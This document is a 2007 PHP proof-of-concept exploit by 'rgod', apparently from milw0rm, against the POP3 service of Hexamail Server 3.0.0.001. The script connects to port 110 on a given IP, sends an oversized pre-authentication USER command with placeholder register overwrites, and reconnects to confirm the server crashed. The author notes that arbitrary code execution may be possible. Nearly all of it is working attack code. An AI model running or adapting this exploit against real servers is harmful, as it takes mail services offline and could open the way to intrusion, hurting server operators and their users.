<?php
/*

Hexamail Server 3.0.0.001 (pop3) pre-auth remote overflow poc

by rgod
http://retrogod.altervista.org

tested against the Lite one
this one crashes the entire server
you are in control of eax and ecx,
I think arbitrary code execution is possible
but a little tricky, see you soon ;)

vendor url: http://www.hexamail.com/hexamailserver/

*/

error_reporting(0);
if ($argc<2) {die("[!]Syntax: php $argv[0] [ip]\n");}
echo "[*]Connecting to target host...\n";
$fp=fsockopen($argv[1],110, $errno, $errstr, 5);
if (!$fp) {die("[!]unable to connect ...");}
else {echo "[*]connected...\n";}
$eax="XXXX";
$ecx="YYYY";
$bof="./".str_repeat("A",15).$eax.$ecx.str_repeat("A",1025);
$bof = "USER ".$bof."\r\n";
fputs($fp,$bof);
fgets($fp);
fclose($fp);
echo "[*]Sent.\n";
sleep(2);
$fp=fsockopen($argv[1],110, $errno, $errstr, 5);
if (!$fp) {echo "[*]exploit succeeded...\n";}
else {echo "[!]it seems not working...\n";}
?>

# milw0rm.com [2007-08-30]
